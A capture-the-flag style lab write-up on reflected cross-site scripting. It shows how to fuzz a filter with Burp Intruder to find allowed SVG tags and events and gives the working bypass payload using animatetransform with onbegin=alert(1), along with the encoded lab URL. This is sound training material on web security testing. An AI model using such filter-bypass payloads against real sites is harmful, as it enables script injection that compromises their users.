## 16 - Reflected XSS with some SVG markup allowed

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the alert() function.

## Notes

- Nothing

## Resume

1. Capture a search request
2. Identify allowed HTML tags
3. Identify allowed event handlers
4. Craft the final XSS payload
5. Trigger the XSS

## Solve

A standard XSS payload such as:

```html
<img src=1 onerror=alert(1)>
```

is blocked by the application filter.

This indicates that both HTML tags and event handlers are being filtered.

First, capture a search request and send it to `Burp Intruder`.

Replace the search value with:

```html
<>
```

Add a payload position between the angle brackets:

```html
<§§>
```

Use the `Copy tags` payload list from the XSS Cheat Sheet and launch a sniper attack.

Results:

- Most payloads return `HTTP 400`
- The following tags return `HTTP 200`:
  - `<svg>`
  - `<animatetransform>`
  - `<title>`
  - `<image>`

This confirms that these tags are allowed by the filter.

Next, replace the payload with:

```html
<svg><animatetransform%20§§=1>
```

Use the `Copy events` payload list from the XSS Cheat Sheet and launch another sniper attack.

Results:

- Most event handlers return `HTTP 400`
- Only `onbegin` returns `HTTP 200`

This confirms that the `onbegin` event is allowed.

```html
https://0aa2009a035d6b5e820f061400d70021.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

Decoded payload:

```html
"><svg><animatetransform onbegin=alert(1)>
```

Explanation:

- `">` escapes the current HTML context.
- `<svg>` injects an allowed SVG element.
- `<animatetransform>` is an allowed SVG tag.
- `onbegin` is an allowed event handler.
- The `onbegin` event automatically fires when the SVG animation starts.
- This executes:

```javascript
alert(1)
```

Opening the crafted URL in the browser triggers the XSS and solves the lab.
